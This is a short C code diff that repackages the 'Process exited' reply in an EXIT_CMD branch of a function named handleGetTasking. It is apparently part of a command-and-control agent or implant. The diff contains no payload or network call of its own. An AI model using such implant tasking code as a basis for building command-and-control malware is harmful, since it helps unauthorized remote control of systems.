@@ -35,9 +35,10 @@ BOOL handleGetTasking(PParser getTasking)
 		else if (taskCmd == EXIT_CMD)
 		{
 			// Create output package
-			PPackage output = newPackage(0, FALSE);
 			const char* exitMessage = "Process exited";
-			addString(response, exitMessage, TRUE);
+			PPackage output = newPackage(0, FALSE);
+			addString(output, exitMessage, FALSE);
+			addBytes(response, (PBYTE)output->buffer, output->length, TRUE);
 			freePackage(output);
 
 			// Send response before exiting
